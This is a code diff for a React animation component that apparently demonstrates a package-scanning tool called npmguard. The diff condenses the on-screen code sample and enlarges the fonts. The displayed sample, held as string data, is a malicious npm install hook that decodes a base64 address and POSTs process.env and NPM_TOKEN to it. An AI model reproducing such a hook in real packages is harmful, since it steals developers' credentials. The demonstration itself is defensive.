@@ -13,12 +13,8 @@ const CODE_LINES = [
   { text: 'const http = require("http");', suspicious: false },
   { text: 'const os = require("os");', suspicious: false },
   { text: "", suspicious: false },
-  { text: "// post-install hook", suspicious: false },
   { text: "module.exports = async () => {", suspicious: false },
-  { text: "  const d = Buffer.from(", suspicious: true },
-  { text: '    "aHR0cDovLzE5Mi4xNjguMS4x",', suspicious: true },
-  { text: '    "base64"', suspicious: true },
-  { text: "  ).toString();", suspicious: true },
+  { text: '  const d = Buffer.from("aHR0cDovLzE5Mi4x", "base64");', suspicious: true },
   { text: "", suspicious: false },
   { text: "  const payload = {", suspicious: true },
   { text: "    env: process.env,", suspicious: true },
@@ -26,14 +22,12 @@ const CODE_LINES = [
   { text: "    token: process.env.NPM_TOKEN", suspicious: true },
   { text: "  };", suspicious: true },
   { text: "", suspicious: false },
-  { text: "  http.request(d, {", suspicious: true },
-  { text: '    method: "POST",', suspicious: true },
-  { text: "    body: JSON.stringify(payload)", suspicious: true },
-  { text: "  });", suspicious: true },
+  { text: '  http.request(d, { method: "POST",', suspicious: true },
+  { text: "    body: JSON.stringify(payload) });", suspicious: true },
   { text: "};", suspicious: false },
 ];
 
-const LINE_H = 30;
+const LINE_H = 38;
 
 const STATUS_EVENTS = [
   { frame: 5, text: "Scanning source...", color: colors.investigating },
@@ -157,7 +151,7 @@ export const AgentFeed: React.FC = () => {
       >
         <div
           style={{
-            width: 1200,
+            width: 1400,
             transform: `scale(${zoom}) rotateY(${rotateY}deg) rotateX(${rotateX}deg)`,
             filter: `blur(${blurAmount}px)`,
             opacity: panelOpacity,
@@ -187,7 +181,7 @@ export const AgentFeed: React.FC = () => {
               }}
             >
               <div style={{ display: "flex", alignItems: "center", gap: 10 }}>
-                <span style={{ fontFamily: fonts.mono, fontSize: 13, fontWeight: 700, color: colors.accent }}>
+                <span style={{ fontFamily: fonts.mono, fontSize: 16, fontWeight: 700, color: colors.accent }}>
                   npmguard
                 </span>
                 <span style={{ fontFamily: fonts.mono, fontSize: 13, color: "rgba(255,255,255,0.3)" }}>
@@ -266,9 +260,9 @@ export const AgentFeed: React.FC = () => {
                     <span
                       style={{
                         fontFamily: fonts.mono,
-                        fontSize: 13,
+                        fontSize: 16,
                         color: isHighlighted ? `rgba(248, 113, 113, ${susOp * 0.6})` : "rgba(255,255,255,0.12)",
-                        width: 32,
+                        width: 36,
                         textAlign: "right",
                         marginRight: 20,
                         userSelect: "none",
@@ -279,7 +273,7 @@ export const AgentFeed: React.FC = () => {
                     <span
                       style={{
                         fontFamily: fonts.mono,
-                        fontSize: 15,
+                        fontSize: 20,
                         color: isHighlighted ? colors.danger : "rgba(255,255,255,0.7)",
                         fontWeight: isHighlighted ? 600 : 400,
                       }}
